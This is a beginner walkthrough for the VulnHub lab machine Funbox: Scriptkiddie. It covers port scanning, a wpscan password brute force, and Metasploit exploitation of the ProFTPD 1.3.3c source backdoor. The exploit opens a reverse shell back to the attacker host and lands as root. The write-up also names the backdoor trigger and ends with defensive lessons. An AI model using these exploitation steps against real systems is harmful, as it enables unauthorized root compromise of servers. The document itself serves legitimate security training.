# Funbox: Scriptkiddie — VulnHub Walkthrough (Beginner Friendly)

> Also known as **Funbox 11**. The author calls it *"a very easy box for
> beginners"* — and it is: a single well-known FTP vulnerability drops you
> straight into a **root** shell. Every step is explained.

| Field | Value |
| --- | --- |
| **Machine** | Funbox: Scriptkiddie |
| **Difficulty** | Easy |
| **Author** | 0815R2d2 |
| **Released** | 20 July 2021 |
| **VulnHub Entry** | https://vulnhub.com/entry/funbox-scriptkiddie,725/ |
| **Download** | https://vulnhub.com/entry/funbox-scriptkiddie,725/#download |
| **Attacker** | Kali Linux (attacker `192.168.56.10`, target `192.168.56.101`) |
| **Target OS** | Linux (Ubuntu) |

> **Important:** the box's web page expects the hostname **`funbox11`**. Add it
> to `/etc/hosts` before browsing, or the site will look broken.

---

## 0. What you will learn

- How to discover a host and scan its ports.
- Why an HTTP page can silently point you to a **hostname** you must add to
  `/etc/hosts`.
- How to enumerate a WordPress site (`gobuster`, `wpscan`) and recognise when it
  is a *dead end*.
- How to identify a **vulnerable service version** (ProFTPD 1.3.3c) with
  `searchsploit` and exploit it with Metasploit.
- That this backdoor returns a **root shell directly** — no privilege
  escalation step required.

**Prerequisites:** Kali Linux with your target VM imported and both on the same
host-only network (attacker `192.168.56.10`, target `192.168.56.101`).

---

## 1. Reconnaissance — finding the target

> **Goal:** confirm the target's IP address on your isolated lab network.

```bash
# What is my attacker IP and subnet?
ip a
```

```text
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 ...
    inet 192.168.56.10/24 brd 192.168.56.255 scope global eth0
```

```bash
# List live hosts with ARP (fast, works even if the host blocks ping)
sudo arp-scan --interface=eth0 --localnet
```

```text
192.168.56.10   08:00:27:aa:bb:cc   PCS Systemtechnik GmbH   (Kali)
192.168.56.101  08:00:27:11:22:33   PCS Systemtechnik GmbH   (target)
```

**Target IP:** `192.168.56.101`

![arp-scan finding the target](images/01-recon.png)

---

## 2. Enumeration — open ports and services

```bash
# This box exposes many ports — scan all of them
sudo nmap -p- --min-rate 1000 -T4 -oA scans/allports 192.168.56.101
sudo nmap -sC -sV -p 21,22,25,80,110,139,143,445 -oA scans/services 192.168.56.101
```

```text
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         ProFTPD 1.3.3c          <-- old and backdoored
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.10
25/tcp  open  smtp        Postfix smtpd
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
110/tcp open  pop3        Dovecot pop3d
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X
143/tcp open  imap        Dovecot imapd
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

> **How to read it:** there are many services, but the standout is
> **`ProFTPD 1.3.3c`**. That exact version shipped with a malicious **backdoor**
> in its source code — an immediate red flag.

### 2.1 Fix the hostname problem

Browsing `http://192.168.56.101/` shows a page that links to `http://funbox11`.
The target expects a `Host: funbox11` header, so we add it locally.

```bash
sudo -e /etc/hosts
```

Add this line (keep any existing lines):

```text
192.168.56.101  funbox11
```

> **Why it works:** `/etc/hosts` lets your machine resolve `funbox11` to the
> target's IP without DNS. Virtual-hosted web servers often serve different
> content depending on the requested hostname.

### 2.2 Enumerate the website (a deliberate dead end)

```bash
gobuster dir -u http://funbox11/ \
  -w /usr/share/wordlists/dirb/common.txt -t 40 -x php,txt,html
```

```text
/wp-admin/           (Status: 301)
/wp-login.php        (Status: 200)
/wp-content/         (Status: 301)
/readme.html         (Status: 200)
```

The site is **WordPress**. A natural guess is `admin:admin`, and `wpscan` can
confirm the username and try a brute force:

```bash
wpscan --url http://funbox11/ --enumerate u
wpscan --url http://funbox11/ -U admin -P /usr/share/wordlists/rockyou.txt
```

```text
[i] User(s) Identified:
[+] admin
[i] No Valid Passwords Found.
```

> **Why it works (and why it stalls):** `wpscan` is the standard WordPress
> scanner. Here it finds the user `admin` but **no exploitable plugin or weak
> password**, so WordPress is a rabbit-hole. Do not spend all your time here —
> move to the FTP service.

![nmap scan and the WordPress site](images/02-nmap.png)

---

## 3. Foothold — gaining the first shell

### 3.1 The vulnerability

`ProFTPD 1.3.3c` contains the **"Compromised Source" backdoor** — attackers
tampered with the project's source and added a hidden command that spawns a
shell when a client sends a specific username. It is publicly documented:

- Exploit-DB **16921** — *ProFTPd-1.3.3c Backdoor Command Execution (Metasploit)*
- Exploit-DB **15662** — *ProFTPd 1.3.3c Compromised Source Backdoor RCE*

```bash
searchsploit "ProFTPD 1.3.3c"
```

```text
ProFTPd-1.3.3c - Backdoor Command Execution (Metasploit) | linux/remote/16921.rb
```

> **Why it works:** the backdoor runs the command as whatever user the FTP
> daemon runs as — and on this image that is **`root`**. There is no separate
> privilege-escalation phase.

### 3.2 Exploit it with Metasploit

```bash
msfconsole -q
```

```text
msf6 > use exploit/unix/ftp/proftpd_133c_backdoor
msf6 exploit(unix/ftp/proftpd_133c_backdoor) > set RHOSTS 192.168.56.101
msf6 exploit(unix/ftp/proftpd_133c_backdoor) > set payload cmd/unix/reverse
msf6 exploit(unix/ftp/proftpd_133c_backdoor) > set LHOST 192.168.56.10
msf6 exploit(unix/ftp/proftpd_133c_backdoor) > run
```

```text
[*] Started reverse TCP double handler on 192.168.56.10:4444
[*] 192.168.56.101:21 - Sending Backdoor Command
[*] Command shell session 1 opened (192.168.56.10:4444 -> 192.168.56.101:50712)

id
uid=0(root) gid=0(root) groups=0(root),65534(nogroup)
root@funbox11:/#
```

> **Manual alternative (no Metasploit):** read `searchsploit -m 15662` and put
> `HELP` / the magic username `ACIDBITCHEZ…` on the FTP connection as the PoC
> describes. Metasploit simply automates this.

![Metasploit ProFTPD exploit](images/03-foothold.png)

### 3.3 Get a stable TTY

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

![root shell as funbox11](images/04-shell.png)

---

## 4. Privilege escalation — becoming root

**There is no privilege-escalation step on this box.** The FTP backdoor already
returned a shell running as `root`:

```bash
id
```

```text
uid=0(root) gid=0(root) groups=0(root)
```

> **Why it works:** the vulnerable `proftpd` process was started by `init` as
> `root`, so any command the backdoor executes inherits `root` privileges. This
> is why the box is rated *Easy* — the "privesc" and the foothold are the same
> event.

### The root flag

```bash
cd /root
ls -la
cat root.txt
```

```text
# ASCII art banner / a single flag; varies by build
```

![root flag](images/05-root-flag.png)

---

## 5. Summary of vulnerabilities

| # | Vulnerability | Where | Impact |
| --- | --- | --- | --- |
| 1 | ProFTPD 1.3.3c compromised-source backdoor | FTP :21 | Remote Code Execution **as root** |
| 2 | Outdated, unsupported software | Multiple services | Broad, well-documented attack surface |
| 3 | WordPress with no hardening / version banner | HTTP :80 | User enumeration (dead end on this build) |

## 6. Defensive lessons (blue team)

- **Patch, patch, patch.** No supported ProFTPD is version 1.3.3c. Subscribe to
  vendor advisories and track service versions.
- **Never run network services as `root`.** Run `proftpd` (and every daemon)
  as a dedicated low-privilege user so a service compromise cannot become a
  host compromise.
- **Verify source integrity.** The backdoor entered via a tampered release;
  checksum/sign software you deploy.
- **Reduce attack surface.** Disable unused services (SMTP, POP3, IMAP, Samba)
  on hosts that do not need them.
- **Detection:** monitor FTP for the backdoor's magic username, and alert on
  unexpected outbound shells from a server that should merely store files.

---

## 7. References

- VulnHub entry: https://vulnhub.com/entry/funbox-scriptkiddie,725/
- Exploit-DB 16921 — ProFTPd 1.3.3c Backdoor (Metasploit):
  https://www.exploit-db.com/exploits/16921
- Exploit-DB 15662 — ProFTPd 1.3.3c Compromised Source Backdoor:
  https://www.exploit-db.com/exploits/15662
- wpscan: https://wpscan.com/wordpress-security-scanner
- Community writeups consulted:
  - [An ordinary day — FUNBOX: SCRIPTKIDDIE](https://blog.gibbons.digital/hacking/2021/08/01/scriptkiddie.html)
  - [Infosec Institute — Funbox Scriptkiddie walkthrough](https://www.infosecinstitute.com/resources/capture-the-flag/funbox-scriptkiddie-vulnhub-capture-the-flag-walkthrough/)

---

## 8. Screenshot checklist

- [ ] `images/01-recon.png` — finding the target with `arp-scan`
- [ ] `images/02-nmap.png` — nmap showing `ProFTPD 1.3.3c` + WordPress
- [ ] `images/03-foothold.png` — Metasploit ProFTPD exploit succeeding
- [ ] `images/04-shell.png` — root shell on `funbox11`
- [ ] `images/05-root-flag.png` — `cat /root/root.txt`

---

_Back to the [catalog](../../docs/CATALOG.md) · [README](../../README.md)._
